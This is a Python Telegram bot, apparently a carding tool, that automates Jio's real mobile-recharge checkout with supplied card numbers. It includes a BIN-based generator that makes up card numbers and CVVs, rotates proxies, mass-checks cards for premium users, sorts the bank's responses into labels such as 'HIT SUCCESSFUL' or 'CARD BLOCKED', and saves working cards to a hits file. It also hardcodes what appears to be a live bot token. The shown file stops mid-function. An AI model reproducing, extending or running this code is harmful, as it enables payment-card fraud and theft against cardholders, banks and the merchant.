# Jio Recharge Bot — Single-file, fully self-contained
import telebot, re, time, os, sys, json, threading, random, datetime, subprocess, asyncio
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

# =====================================================================
# PLAYWRIGHT BOOTSTRAP
# =====================================================================
def _find_chromium():
    """Find an existing Chromium binary on the system."""
    import shutil
    from glob import glob
    candidates = [
        "/ms-playwright/chromium-*/chrome-linux/chrome",
        "/ms-playwright/chromium-*/chrome-linux/headless_shell",
        "/ms-playwright/chromium_headless_shell-*/chrome-linux/headless_shell",
        "/root/.cache/ms-playwright/chromium-*/chrome-linux/chrome",
        "/root/.cache/ms-playwright/chromium-*/chrome-linux/headless_shell",
        "/home/*/.cache/ms-playwright/chromium-*/chrome-linux/chrome",
        "/usr/bin/chromium",
        "/usr/bin/chromium-browser",
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable",
        shutil.which("chromium"),
        shutil.which("chromium-browser"),
        shutil.which("google-chrome"),
        shutil.which("google-chrome-stable"),
    ]
    for c in candidates:
        if not c:
            continue
        if "*" in c:
            matches = sorted(glob(c))
            if matches:
                return matches[-1]
        else:
            if Path(c).exists():
                return c
    return None


def _install_chromium():
    """Install playwright chromium + system deps. Returns True on success."""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "playwright"])
    except Exception as e:
        print(f"[BOOT] pip playwright failed: {e}")

    # install system deps first (needs root in docker)
    try:
        subprocess.check_call(
            [sys.executable, "-m", "playwright", "install-deps", "chromium"],
            timeout=300
        )
        print("[BOOT] install-deps OK")
    except Exception as e:
        print(f"[BOOT] install-deps failed (non-fatal): {str(e)[:120]}")

    # then install browser
    try:
        subprocess.check_call(
            [sys.executable, "-m", "playwright", "install", "chromium"],
            timeout=300
        )
        print("[BOOT] chromium install OK")
    except Exception as e:
        print(f"[BOOT] chromium install failed: {str(e)[:120]}")
        return False

    return True


def _ensure_chromium():
    """Check chromium; install if missing."""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("[BOOT] playwright not installed, installing...")
        _install_chromium()
        try:
            from playwright.sync_api import sync_playwright
        except ImportError:
            print("[BOOT] playwright STILL not installed")
            return

    try:
        with sync_playwright() as p:
            path = p.chromium.executable_path
            if path and Path(path).exists():
                print(f"[BOOT] Chromium OK: {path}")
                return
            print(f"[BOOT] Chromium path missing: {path}")
    except Exception as e:
        print(f"[BOOT] Playwright check failed: {str(e)[:120]}")

    print("[BOOT] Installing Chromium...")
    _install_chromium()

    # recheck
    try:
        with sync_playwright() as p:
            path = p.chromium.executable_path
            if path and Path(path).exists():
                print(f"[BOOT] Chromium OK after install: {path}")
            else:
                print(f"[BOOT] Chromium STILL missing: {path}")
    except Exception as e:
        print(f"[BOOT] Recheck failed: {str(e)[:120]}")


def _ensure_chromium_async():
    def worker():
        try: _ensure_chromium()
        except Exception as e: print(f"[BOOT] Background install failed: {e}")
    threading.Thread(target=worker, daemon=True).start()

_ensure_chromium_async()


# =====================================================================
# JIO CHECKOUT (inlined from jio.py)
# =====================================================================
def _jio_dbg(msg):
    print(f"[jio] {msg}", flush=True)


def _urldecode(s):
    try:
        from urllib.parse import unquote
        return unquote(s)
    except Exception:
        return s


def _page_text(page):
    try:
        text = page.locator("body").inner_text(timeout=4000)
    except Exception:
        text = ""
    return re.sub(r"\s+", " ", text).strip()


def _launch_browser(pw, launch_kwargs):
    """Launch chromium with full fallback."""
    # try default first
    try:
        return pw.chromium.launch(**launch_kwargs)
    except Exception as e:
        err = str(e).lower()
        if ("executable doesn't exist" not in err
                and "executable not found" not in err
                and "please run the following command" not in err
                and "host system is missing" not in err):
            raise
        print(f"[jio] Default launch failed, trying fallback...")

    # try alternate path
    found = _find_chromium()
    if found:
        print(f"[jio] Trying alternate: {found}")
        launch_kwargs["executable_path"] = found
        try:
            return pw.chromium.launch(**launch_kwargs)
        except Exception as e2:
            print(f"[jio] Alternate failed: {str(e2)[:120]}")

    # last resort: install
    print("[jio] Installing Chromium as last resort...")
    _install_chromium()
    launch_kwargs.pop("executable_path", None)
    return pw.chromium.launch(**launch_kwargs)


def luhn_check_digit(pan_no_check):
    digits = [int(d) for d in pan_no_check]
    digits.reverse()
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == 0:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return str((10 - total % 10) % 10)


def generate_cards(bin_str, mm, yyyy, count):
    b = re.sub(r"\D", "", bin_str)
    total_len = 15 if b.startswith(("34", "37")) else 16
    cards = []
    for _ in range(count):
        pre = b + "".join(random.choices("0123456789", k=max(total_len - 1 - len(b), 0)))
        pan = pre + luhn_check_digit(pre)
        cards.append({"pan": pan, "exp_month": mm.zfill(2), "exp_year": yyyy,
                      "cvv": f"{random.randint(0, 999):03d}"})
    return cards


def parse_card_line(line):
    parts = re.split(r"[|/:\s]+", line.strip())
    if len(parts) < 4:
        return None
    pan, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if not re.fullmatch(r"\d{13,19}", pan):
        return None
    mm = mm.zfill(2)
    if len(yy) == 4:
        yyyy = yy
    elif len(yy) == 2:
        yyyy = "20" + yy
    else:
        yyyy = "20" + yy.zfill(2)
    return {"pan": pan, "exp_month": mm, "exp_year": yyyy, "cvv": cvv}


def card_label(card):
    return f"{card['pan']}|{card['exp_month']}|{card['exp_year'][-2:]}|{card['cvv']}"


def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
    """Returns (status, message, url, meta)."""
    from playwright.sync_api import sync_playwright

    if deadline is None:
        deadline = time.time() + 220
    meta = {"merchant": "Jio Recharge", "amount": amount, "plan": ""}

    p = sync_playwright()
    pw = p.start()
    launch_kwargs = {"headless": headless}
    if proxy:
        launch_kwargs["proxy"] = proxy

    try:
        browser = _launch_browser(pw, launch_kwargs)
    except Exception as e:
        try: pw.stop()
        except: pass
        return "error", f"Browser launch failed: {str(e)[:150]}", "", meta

    page = browser.new_page()
    try:
        page.goto("https://www.jio.com/selfcare/recharge/mobility",
                  wait_until="domcontentloaded", timeout=60000)
        page.wait_for_timeout(3000)
        frame = page.main_frame
        callback = {}
        _jio_dbg(f"jio {phone}: loaded recharge page")

        def _capture_cb(req):
            if "myjio-b2b-callback" in req.url:
                callback["url"] = req.url
        page.on("request", _capture_cb)

        pay_url = frame.evaluate(
            """async (arg) => {
                const phone = arg.phone, amt = arg.amt;
                const tmo = (ms) => new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms));
                const fj = (u, o) => Promise.race([fetch(u, o), tmo(45000)]);
                const rn = await fj('/api/jio-recharge-service/recharge/mobility/number/' + phone);
                if (rn.status !== 200) return {error: true, msg: 'notsub'};
                const rp = await fj('/api/jio-recharge-service/recharge/plans/serviceId/' + phone);
                if (rp.status !== 200) return {error: true, msg: 'plans'};
                const d = await rp.json();
                let key = null;
                for (const c of d.planCategories || [])
                  for (const sc of (c.subCategories || []))
                    for (const pl of (sc.plans || []))
                      if (String(pl.amount) === String(amt) && pl.key) { key = pl.key; break; }
                if (!key) return {error: true, msg: 'noplan'};
                await fj('/api/jio-recharge-service/recharge/buy', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({planKey: key, selectedService: phone})});
                const rpay = await fj('/api/jio-recharge-service/recharge/pay', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({addonPlanKeys:[], flexiTopupFlow:false, servicePlanList:[{planKey: key, quantity:1, serviceId: phone}]})});
                const j = await rpay.json();
                return {error: false, url: j.paymentURL || null};
              }""",
            {"phone": str(phone), "amt": str(amount)},
        )
        if pay_url.get("error"):
            if pay_url.get("msg") == "notsub":
                return "error", f"Number {phone} is not a valid Jio prepaid subscriber.", page.url, meta
            if pay_url.get("msg") == "noplan":
                return "error", f"Could not find a ₹{amount} plan for {phone}.", page.url, meta
            return "error", f"Could not fetch Jio plans for {phone}.", page.url, meta
        if not pay_url.get("url"):
            return "error", f"Could not generate payment link for ₹{amount}.", page.url, meta
        _jio_dbg(f"jio {phone}: payment url ok")

        try:
            page.goto(pay_url["url"], wait_until="domcontentloaded", timeout=60000)
        except Exception:
            pass
        page.wait_for_timeout(3000)
        try:
            page.wait_for_url("**pay.jio.com**", timeout=30000)
        except Exception:
            pass
        page.wait_for_timeout(2000)
        _jio_dbg(f"jio {phone}: on {page.url[:80]}")

        pf = page.main_frame
        clicked_card = False
        for _ in range(15):
            clicked_card = pf.evaluate("""() => {
              const els = [...document.querySelectorAll('*')];
              const el = els.find(e => {
                const t = (e.innerText||'').trim();
                return /Credit\\/Debit|ATM Card|Debit Card|Credit Card/i.test(t) && t.length < 40 && e.children.length <= 1 && e.offsetParent !== null;
              });
              if (!el) return false;
              let n = el;
              for (let i=0; i<8 && n; i++) {
                if (/j-listBlock\\b|align-middle/.test((n.className||'').toString()) && n.offsetParent !== null) { n.click(); return true; }
                n = n.parentElement;
              }
              if (el.click) { el.click(); return true; }
              return false;
            }""")
            if clicked_card:
                break
            page.wait_for_timeout(1000)
        page.wait_for_timeout(4000)
        _jio_dbg(f"jio {phone}: card form opened ({clicked_card})")

        for _ in range(20):
            if "add-new-card" in page.url or "saved-cards" in page.url:
                break
            if "cardinalcommerce" in page.url or "3dsecure" in page.url.lower():
                break
            if "home" in page.url and "/JpgWebApp/home" in page.url:
                pf = page.main_frame
                pf.evaluate("""() => {
                  const els=[...document.querySelectorAll('*')];
                  const el=els.find(e=>{const t=(e.innerText||'').trim();return /Credit\\/Debit|ATM Card|Debit Card|Credit Card/i.test(t)&&t.length<40&&e.children.length<=1&&e.offsetParent!==null;});
                  if(!el)return false;
                  let n=el;for(let i=0;i<8&&n;i++){if(/j-listBlock\\b|align-middle/.test((n.className||'').toString())&&n.offsetParent!==null){n.click();return true;}n=n.parentElement;}
                  if(el.click){el.click();return true;}return false;
                }""")
            page.wait_for_timeout(1000)
        page.wait_for_timeout(2000)
        pf = page.main_frame

        def fresh():
            nonlocal pf
            pf = page.main_frame

        def fill(name, val, use_type=False):
            try:
                loc = pf.locator(f"input[name='{name}']")
                if loc.count():
                    if use_type:
                        loc.first.click(timeout=3000)
                        loc.first.type(val, delay=25)
                    else:
                        loc.first.fill(val, timeout=4000)
            except Exception:
                fresh()

        pan = card.get("pan", "").replace(" ", "")
        exp = f"{card.get('exp_month','')}/{card.get('exp_year','')[-2:]}"
        for _ in range(4):
            try:
                fill("Card number", pan)
                fill("Expiry (MM/YY)", exp)
                fill("CVV", card.get("cvv", ""))
                fill("Name on the card", (card.get("holder_name", "") or "Card Holder"))
            except Exception:
                fresh()
            page.wait_for_timeout(500)
            try:
                got = pf.locator("input[name='Card number']").first.input_value() \
                    if pf.locator("input[name='Card number']").count() else ""
                if got and got.replace(" ", "")[:6] == pan[:6]:
                    break
            except Exception:
                fresh()

        page.keyboard.press("Tab")
        page.wait_for_timeout(500)
        page.keyboard.press("Tab")
        page.wait_for_timeout(4000)

        for _ in range(10):
            try:
                clicked = pf.evaluate("""() => {
                  const b=[...document.querySelectorAll('button')].find(e=>/^Pay\\s|Pay now|Verify & pay/i.test((e.innerText||'').trim()) && !e.disabled);
                  if(b){b.click(); return (b.innerText||'').slice(0,30);} return null;
                }""")
                if clicked:
                    break
            except Exception:
                fresh()
            page.wait_for_timeout(1000)
        page.wait_for_timeout(4000)
        fresh()

        try:
            pf.evaluate("""() => {
              const els = [...document.querySelectorAll('*')];
              const el = els.find(e => (/INR|INDIAN RUPEE/i.test((e.innerText||'').trim())) && (e.innerText||'').length < 80 && e.children.length <= 1);
              if (el) { let n = el; for (let i=0; i<6 && n; i++) { if (n.click) { n.click(); break; } n = n.parentElement; } }
            }""")
        except Exception:
            pf = page.main_frame
        page.wait_for_timeout(3000)

        for _ in range(20):
            u = page.url
            if "cardinalcommerce" in u or "3dsecure" in u.lower():
                break
            if "paytm" in u or "payglocal" in u:
                break
            if "easebuzz" in u or "acs" in u:
                page.wait_for_timeout(1000)
                continue
            page.wait_for_timeout(1000)
        _jio_dbg(f"jio {phone}: redirected to {page.url[:80]}")

        if "payglocal" in page.url:
            _jio_dbg(f"jio {phone}: on PayGlocal")
            for _ in range(10):
                try:
                    pgf = page.main_frame
                    ziploc = pgf.locator("#gl_billing_addressPostalCode")
                    if ziploc.count():
                        ziploc.first.fill("10080", timeout=3000)
                        break
                except Exception:
                    pass
                page.wait_for_timeout(1000)
            for _ in range(10):
                try:
                    pgf = page.main_frame
                    inr_clicked = pgf.evaluate("""() => {
                      const bs = [...document.querySelectorAll('button')];
                      const b = bs.find(e => (/\\u20b9/.test(e.innerText||'') && /Pay/i.test(e.innerText||'') && !e.disabled));
                      if (b) { b.click(); return true; }
                      return false;
                    }""")
                    if inr_clicked:
                        break
                except Exception:
                    pass
                page.wait_for_timeout(1000)
            page.wait_for_timeout(4000)
            _jio_dbg(f"jio {phone}: PayGlocal submitted")

        if "paytm" in page.url and "selectCurrency" in page.url:
            for _ in range(12):
                chose = pf.evaluate("""() => {
                  const els = [...document.querySelectorAll('*')];
                  const el = els.find(e => {
                    const t = (e.innerText||'').trim();
                    return /Indian Rupee|INR/i.test(t) && t.length < 60 && e.children.length <= 1 && e.offsetParent !== null;
                  });
                  if (el) { let n = el; for (let i=0; i<8 && n; i++) { if (n.click && n.offsetParent !== null) { n.click(); break; } n = n.parentElement; } return true; }
                  return false;
                }""")
                if chose:
                    break
                page.wait_for_timeout(1000)
            page.wait_for_timeout(2000)
            for _ in range(5):
                did_proceed = pf.evaluate("""() => {
                  const b=[...document.querySelectorAll('button')].find(e=>/Proceed|Pay|Continue|Make Payment/i.test((e.innerText||'').trim()) && !e.disabled);
                  if(b){b.click(); return true;} return false;
                }""")
                if did_proceed:
                    break
                page.wait_for_timeout(1000)
            page.wait_for_timeout(3000)

        _jio_dbg(f"jio {phone}: waiting for result")
        stalled = 0
        for i in range(34):
            page.wait_for_timeout(1500)
            u = page.url
            if callback.get("url"):
                em = re.search(r"errorMessage=([^&]*)", callback["url"])
                ec = re.search(r"errorCode=([^&]*)", callback["url"])
                emsg = _urldecode(em.group(1)) if em else ""
                ecode = ec.group(1) if ec else ""
                if ecode == "0" or (not ecode and not emsg):
                    return "success", "Payment done.", u, meta
                if "declin" in emsg.lower() or (ecode and ecode != "0"):
                    return "failed", "Declined: " + emsg[:120], u, meta
            if "cardinalcommerce" in u or "3dsecure" in u.lower() or "threedsecure" in u.lower():
                return "requires_action", "3DS required.", u, meta
            if "3ds2" in u or "instaproxy" in u:
                for _ in range(4):
                    page.wait_for_timeout(1500)
                    if callback.get("url"):
                        break
                    if "instaproxy" not in page.url and "3ds2" not in page.url:
                        break
                if callback.get("url"):
                    continue
                if "instaproxy" in page.url or "3ds2" in page.url:
                    return "requires_action", "3DS required.", page.url, meta
                continue
            if "payglocal" in page.url and ("retry" in page.url or "payflow-ui/error" in page.url):
                return "failed", "Declined.", page.url, meta
            if "payglocal" in page.url:
                plow = _page_text(page).lower()
                if any(w in plow for w in ("payment unsuccessful", "was not successful", "could not process", "payment failed", "transaction was declined", "your payment was declined", "insufficient", "declined", "not completed", "unsuccessful", "try again later", "try again")):
                    return "failed", "Declined.", page.url, meta
                _three_ds = False
                for f in page.frames:
                    fu = f.url
                    if ("authentication.cardinalcommerce.com" in fu and "threedsecure" in fu.lower()) or "3ds2/authenticate" in fu or "cruise/stepup" in fu.lower() or "V2/Cruise/StepUp" in fu:
                        _three_ds = True
                        break
                if _three_ds:
                    resolved = False
                    for _ in range(14):
                        page.wait_for_timeout(1500)
                        cu = page.url
                        clow = _page_text(page).lower()
                        if "payglocal" in cu and "retry" in cu:
                            return "failed", "Declined.", page.url, meta
                        if any(w in clow for w in ("payment unsuccessful", "was not successful", "could not process", "transaction was declined", "your payment was declined", "declined", "unsuccessful", "insufficient")):
                            return "failed", "Declined.", page.url, meta
                        if "termurlpay" in cu or "payments/termurlpay" in cu:
                            resolved = True
                            break
                    if resolved:
                        continue
                    return "requires_action", "3DS required.", page.url, meta
                for f in page.frames:
                    if "step-up-iframe" in (f.name or "") and f.url and f.url != "about:blank" and "cardinalcommerce" not in f.url and "fingerprint" not in f.url.lower():
                        return "requires_action", "3DS required.", page.url, meta
            if "theia/error" in page.url or ("/error" in page.url and "paytm" in page.url):
                return "failed", "Declined by Paytm.", page.url, meta
            if "paytm" in page.url and "theia" in page.url:
                stalled += 1
                if stalled > 12:
                    return "unknown", "Stuck on Paytm.", page.url, meta
            low = _page_text(page).lower()
            if any(w in low for w in ("declined", "transaction failed", "could not be processed", "payment failed", "not completed", "unsuccessful", "insufficient", "card not", "failed")):
                return "failed", "Declined.", page.url, meta
            if any(w in low for w in ("transaction successful", "recharge successful", "successfully recharged", "payment successful", "thank you", "recharged", "top-up successful", "recharge done")):
                return "success", "Payment done.", page.url, meta
            if "card number" in low and "cv" in low and i > 4:
                return "failed", "Card rejected, form reset.", page.url, meta
            if time.time() > deadline:
                break
        return "unknown", "Couldn't confirm the result.", page.url, meta
    except Exception as exc:
        return "error", f"Jio checkout failed: {str(exc)[:150]}", page.url, meta
    finally:
        try:
            browser.close()
            p.stop()
        except Exception:
            pass


# =====================================================================
# BOT CONFIG
# =====================================================================
BOT_TOKEN = '8970318644:AAGrG_g7UQUONWus5nj2xm5E3WoLtQr6GT4'
ADMIN_ID = 8752143085
bot = telebot.TeleBot(BOT_TOKEN)

os.makedirs('JioData', exist_ok=True)
PREMIUM_FILE = 'JioData/premium.txt'
USERS_FILE = 'JioData/users.txt'
BANNED_FILE = 'JioData/banned.txt'
HITS_FILE = 'JioData/hits.txt'
PROXY_FILE = 'JioData/proxies.txt'

ADMIN_LIMIT = 50
PREMIUM_LIMIT = 15
FREE_LIMIT = 0
WORKERS = 3

ACTIVE_JOBS = {}
ACTIVE_USERS_MPP = {}

for f in [USERS_FILE, PREMIUM_FILE, BANNED_FILE, HITS_FILE, PROXY_FILE]:
    if not os.path.exists(f): open(f, 'w').close()

# =====================================================================
# HELPERS
# =====================================================================
def is_admin(uid): return int(uid) == ADMIN_ID

def is_premium(uid):
    try:
        with open(PREMIUM_FILE, 'r') as f:
            for p in f.read().splitlines():
                parts = p.split('|')
                if len(parts) < 2: continue
                if str(uid) == parts[0].strip():
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
    except: pass
    return False

def is_banned(uid):
    try:
        with open(BANNED_FILE, 'r') as f:
            for b in f.read().splitlines():
                parts = b.split('|')
                if len(parts) < 2: continue
                if str(uid) == parts[0].strip():
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
    except: pass
    return False

def add_user(uid):
    try:
        with open(USERS_FILE, 'r') as f: users = f.read().splitlines()
        if str(uid) not in users:
            with open(USERS_FILE, 'a') as f: f.write(str(uid) + '\n')
    except: pass

def parse_duration(dur):
    dur = dur.lower().strip()
    now = time.time()
    if dur in ('lifetime', 'life', 'forever', 'inf', '0'):
        return 0
    try:
        if dur.endswith('mo'): return now + int(dur[:-2]) * 86400 * 30
        if dur.endswith('s'): return now + int(dur[:-1])
        if dur.endswith('m'): return now + int(dur[:-1]) * 60
        if dur.endswith('h'): return now + int(dur[:-1]) * 3600
        if dur.endswith('d'): return now + int(dur[:-1]) * 86400
        if dur.endswith('w'): return now + int(dur[:-1]) * 86400 * 7
        if dur.endswith('y'): return now + int(dur[:-1]) * 86400 * 365
        return now + int(dur) * 86400
    except:
        return None

def add_premium(tid, exp):
    tid = str(tid).strip()
    try:
        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for l in lines:
                if not l.startswith(tid + "|"): f.write(l)
        with open(PREMIUM_FILE, 'a') as f:
            f.write(f"{tid}|{exp}\n")
        return True
    except Exception as e:
        print(f"add_premium error: {e}")
        return False

def remove_premium(tid):
    tid = str(tid).strip()
    try:
        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for l in lines:
                if not l.startswith(tid + "|"): f.write(l)
        return True
    except: return False

# =====================================================================
# PROXY
# =====================================================================
proxy_list = []

def load_proxies():
    global proxy_list
    proxy_list = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            proxy_list = [l.strip() for l in f if l.strip()]
    return len(proxy_list)

def save_proxies(proxies):
    with open(PROXY_FILE, 'w') as f:
        for p in proxies: f.write(p + '\n')
    load_proxies()

def get_random_proxy():
    if not proxy_list: return None
    return random.choice(proxy_list)

def proxy_dict(entry):
    if not entry: return None
    try:
        host, port, user, pw = entry.split(":")
        return {"server": f"http://{host}:{port}", "username": user, "password": pw}
    except Exception:
        return None

load_proxies()

# =====================================================================
# STATUS CLASSIFIER
# =====================================================================
def status_head(status):
    heads = {
        "success": "✅ <b>HIT SUCCESSFUL</b>",
        "3ds": "🔥 <b>3DS REQUIRED</b>",
        "insufficient": "💸 <b>INSUFFICIENT FUNDS</b>",
        "expired": "📅 <b>CARD EXPIRED</b>",
        "invalid_cvv": "🔒 <b>INVALID CVV</b>",
        "invalid_card": "❌ <b>INVALID CARD</b>",
        "issuer_decline": "🚫 <b>CARD ISSUER DECLINED</b>",
        "blocked": "🔴 <b>CARD BLOCKED</b>",
        "not_permitted": "⛔ <b>NOT PERMITTED</b>",
        "limit_exceeded": "📊 <b>LIMIT EXCEEDED</b>",
        "velocity": "⚠️ <b>VELOCITY LIMIT</b>",
        "processor_error": "🔧 <b>PROCESSOR ERROR</b>",
        "failed": "❌ <b>DECLINED</b>",
        "unknown": "❓ <b>UNKNOWN</b>",
        "error": "⚠️ <b>ERROR</b>",
    }
    return heads.get(status, "⚠️ <b>UNKNOWN</b>")


def classify(st, dt):
    if st == "requires_action":
        st = "3ds"
    low = (dt or "").lower()
    if st == "failed":
        if "insufficient" in low:
            st = "insufficient"
        elif "expired" in low:
            st = "expired"
        elif "cvv" in low or "cvc" in low:
            st = "invalid_cvv"
        elif "do not honor" in low or "issuer" in low:
            st = "issuer_decline"
        elif "blocked" in low or "stolen" in low or "lost" in low:
            st = "blocked"
        elif "not permitted" in low or "international" in low:
            st = "not_permitted"
        elif "limit" in low:
            st = "limit_exceeded"
        elif "processor" in low or "network" in low or "try again" in low or "timeout" in low:
            st = "processor_error"
    return st, dt


def run_check(phone, amount, card, proxy_str=None, timeout=240):
    proxy = proxy_dict(proxy_str) if proxy_str else None
    try:
        with ThreadPoolExecutor(max_workers=1) as ex:
            future = ex.submit(jio_checkout, phone, amount, card, proxy=proxy, headless=True)
            try:
                st, dt, url, meta = future.result(timeout=timeout)
            except Exception as te:
                if "timeout" in str(te).lower():
                    return "error", f"Timeout after {timeout}s", None
                raise
    except Exception as e:
        return "error", f"Check failed: {str(e)[:120]}", None
    return classify(st, dt)


# =====================================================================
# PROXY COMMANDS
# =====================================================================
@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, "❌ <b>You are banned.</b>", parse_mode="HTML"); return
    add_user(uid)
    parts = message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "📝 <b>Use:</b> /proxy add/list/remove", parse_mode="HTML"); return
    cmd = parts[1].split()[0].lower()
    arg = parts[1][len(cmd):].strip()

    if cmd == 'add':
        add_list = []
        if arg: add_list = [l.strip() for l in arg.splitlines() if l.strip()]
        elif message.reply_to_message:
            raw = message.reply_to_message.text or message.reply_to_message.caption or ''
            add_list = [l.strip() for l in raw.splitlines() if l.strip()]
        if not add_list:
            bot.reply_to(message, "📝 /proxy add host:port:user:pass", parse_mode="HTML"); return
        existing = []
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f: existing = [l.strip() for l in f if l.strip()]
        eset = set(existing)
        new = [p for p in add_list if p not in eset]
        save_proxies(existing + new)
        bot.reply_to(message,
            f"📊 <b>Proxy Add Result</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"┣ 📦 Total ➜ {len(add_list)}\n"
            f"┣ ✅ Added ➜ {len(new)}\n"
            f"┗ 🔄 Duplicate ➜ {len(add_list)-len(new)}",
            parse_mode="HTML")

    elif cmd == 'remove':
        if not arg: bot.reply_to(message, "📝 /proxy remove index/all", parse_mode="HTML"); return
        if not os.path.exists(PROXY_FILE): bot.reply_to(message, "❌ No proxies", parse_mode="HTML"); return
        with open(PROXY_FILE, 'r') as f: proxies = [l.strip() for l in f if l.strip()]
        if arg == 'all':
            save_proxies([]); bot.reply_to(message, "✅ <b>All proxies removed</b>", parse_mode="HTML"); return
        try:
            idx = int(arg)
            if idx < 1 or idx > len(proxies):
                bot.reply_to(message, f"❌ Invalid. Total: {len(proxies)}", parse_mode="HTML"); return
            removed = proxies.pop(idx-1); save_proxies(proxies)
            bot.reply_to(message, f"✅ Removed ➜ {removed}\n📦 Remaining ➜ {len(proxies)}", parse_mode="HTML")
        except: bot.reply_to(message, "📝 /proxy remove index/all", parse_mode="HTML")

    elif cmd == 'list':
        if not proxy_list: bot.reply_to(message, "❌ No proxies", parse_mode="HTML"); return
        lines = [f"📋 <b>Proxies ({len(proxy_list)})</b>", "━━━━━━━━━━━━━━━━━━━━"]
        for i, p in enumerate(proxy_list, 1):
            masked = p[:30]+'...' if len(p) > 33 else p
            lines.append(f"┣ {i}. {masked}")
        if len(proxy_list) > 50:
            lines = lines[:50] + [f"┗ ... and {len(proxy_list)-50} more"]
        else: lines[-1] = lines[-1].replace('┣', '┗')
        bot.reply_to(message, "\n".join(lines), parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ <b>Unknown command</b>", parse_mode="HTML")

# =====================================================================
# USER COMMANDS
# =====================================================================
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, "❌ <b>You are banned.</b>", parse_mode="HTML"); return
    add_user(uid)
    bot.reply_to(message,
        f"👋 <b>Welcome to Jio Recharge Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User ➤ <b>{message.from_user.first_name}</b>\n"
        f"🆔 ID ➤ <code>{uid}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ /jio — Single check\n"
        f"📦 /mjio — Mass check\n"
        f"🌐 /proxy — Manage proxies\n"
        f"👤 /info — Account info",
        parse_mode="HTML")

@bot.message_handler(commands=['jio'])
def jio_single(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.reply_to(message, "❌ <b>You are banned.</b>", parse_mode="HTML"); return
    add_user(uid)
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message,
            "📝 <b>Usage:</b> <code>/jio &lt;phone&gt; &lt;amount&gt; &lt;pan|mm|yy|cvv&gt;</code>\n"
            "Example: <code>/jio 9876543210 239 5131112233445566|03|30|086</code>",
            parse_mode="HTML"); return
    phone, amount, cc = args[1], args[2], args[3]
    card = parse_card_line(cc)
    if not card:
        bot.reply_to(message, "❌ <b>Invalid card format.</b>", parse_mode="HTML"); return

    msg = bot.reply_to(message,
        f"⏳ <b>Step 1/5: Launching browser...</b>\n"
        f"👤 Phone: <code>{phone}</code>\n"
        f"💰 Amount: ₹{amount}\n"
        f"💳 Card: <code>{card_label(card)}</code>",
        parse_mode="HTML")

    def update_step(step, text, elapsed):
        try:
            bot.edit_message_text(
                f"⏳ <b>{step}:</b> {text}\n"
                f"👤 Phone: <code>{phone}</code>\n"
                f"💰 Amount: ₹{amount}\n"
                f"💳 Card: <code>{card_label(card)}</code>\n"
                f"⏱️ {elapsed}s",
                message.chat.id, msg.message_id, parse_mode="HTML")
        except: pass

    proxy = get_random_proxy()
    holder = {"st": None, "resp": None}

    def runner():
        try:
            st, resp, _ = run_check(phone, amount, card, proxy_str=proxy)
            holder["st"] = st
            holder["resp"] = resp
        except Exception as e:
            holder["st"] = "error"
            holder["resp"] = f"Failed: {str(e)[:120]}"

    t = threading.Thread(target=runner, daemon=True)
    t.start()

    stages = [
        (5,   "Step 1/5", "Launching browser"),
        (15,  "Step 2/5", "Loading Jio page"),
        (30,  "Step 3/5", "Fetching plans"),
        (50,  "Step 4/5", "Filling card form"),
        (80,  "Step 5/5", "Submitting payment"),
        (120, "Step 5/5", "Awaiting bank response"),
    ]
    start_t = time.time()
    shown = set()
    while t.is_alive():
        elapsed = int(time.time() - start_t)
        for secs, step, text in stages:
            if elapsed >= secs and secs not in shown:
                shown.add(secs)
                update_step(step, text, elapsed)
                break
        time.sleep(2)

    t.join(timeout=5)
    status = holder["st"] or "error"
    response = holder["resp"] or "No response"

    if is_admin(uid): rk = " [ADMIN]"
    elif is_premium(uid): rk = " [PREMIUM]"
    else: rk = " [FREE]"

    safe = str(response).replace("<","").replace(">","").replace("&","")
    safe_name = str(message.from_user.first_name).replace("<","").replace(">","").replace("&","")

    if status == "success":
        with open(HITS_FILE, 'a', encoding="utf-8") as f:
            f.write(f"{phone} Rs{amount} {card_label(card)} - {response}\n")

    head = status_head(status)
    res = (
        f"{head}\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Phone</b> ━ <code>{phone}</code>\n"
        f"💰 <b>Amount</b> ━ ₹{amount}\n"
        f"💳 <b>Card</b> ━ <code>{card_label(card)}</code>\n"
        f"📩 <b>Response</b> ━ {safe}\n"
        f"🌐 <b>Gateway</b> ━ Jio Recharge\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>User:</b> {safe_name}{rk}"
    )
    try: bot.delete_message(message.chat.id, msg.message_id)
    except: pass
    try: bot.reply_to(message, res, parse_mode="HTML")
    except:
        try: bot.reply_to(message, res.replace("<code>","").replace("</code>",""))
        except: pass

@bot.message_handler(commands=['mjio'])
def mjio_mass(message):
    uid = message.from_user.id
    if is_banned(uid):
